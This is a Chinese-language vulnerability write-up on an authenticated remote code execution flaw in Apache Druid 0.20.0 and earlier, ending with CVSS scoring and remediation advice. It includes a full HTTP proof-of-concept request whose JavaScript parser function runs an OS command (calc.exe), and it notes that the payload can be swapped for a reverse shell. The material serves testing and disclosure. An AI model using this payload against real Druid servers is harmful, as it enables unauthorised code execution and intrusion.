验证漏洞存在方法
    - 检查目标Apache Druid版本是否为0.20.0或更早版本
    - 确认是否具有用户认证权限（低权限即可）
    - 尝试发送特制请求测试JavaScript执行功能是否可被绕过

漏洞利用方法
    - 该漏洞允许经过身份验证的用户发送特制请求，强制Apache Druid执行用户提供的JavaScript代码，无论服务器配置如何
    - 攻击者可以利用此漏洞在目标机器上以Druid服务器进程的权限执行任意代码
    - 由于该功能默认禁用，但存在配置绕过漏洞，攻击者可以绕过安全限制执行恶意代码
    
PoC示例：
```http
POST /druid/indexer/v1/sampler HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Basic [base64_encoded_credentials]

{
  "type": "index",
  "spec": {
    "dataSchema": {
      "dataSource": "sample",
      "parser": {
        "type": "string",
        "parseSpec": {
          "format": "javascript",
          "timestampSpec": {
            "column": "timestamp",
            "format": "auto"
          },
          "dimensionsSpec": {
            "dimensions": ["dimension"]
          },
          "function": "function(str) { var out = {}; out['timestamp'] = new Date(); out['dimension'] = 'test'; java.lang.Runtime.getRuntime().exec('calc.exe'); return out; }"
        }
      }
    }
  }
}
```

**注意**：实际利用需要根据目标环境调整JavaScript代码和请求参数。此PoC仅用于演示漏洞原理，实际攻击可能使用更复杂的payload来执行系统命令或获取反向shell。

**影响**：
- CVSS评分：8.8（高危）
- 攻击向量：网络（AV:N）
- 攻击复杂度：低（AC:L）
- 所需权限：低权限认证（PR:L）
- 用户交互：无（UI:N）
- 影响范围：单一系统（S:U）
- 机密性影响：高（C:H）
- 完整性影响：高（I:H）
- 可用性影响：高（A:H）

**修复建议**：
1. 升级到Apache Druid 0.20.1或更高版本
2. 确保JavaScript功能在生产环境中完全禁用
3. 实施严格的输入验证和输出编码
4. 使用最小权限原则运行Druid服务
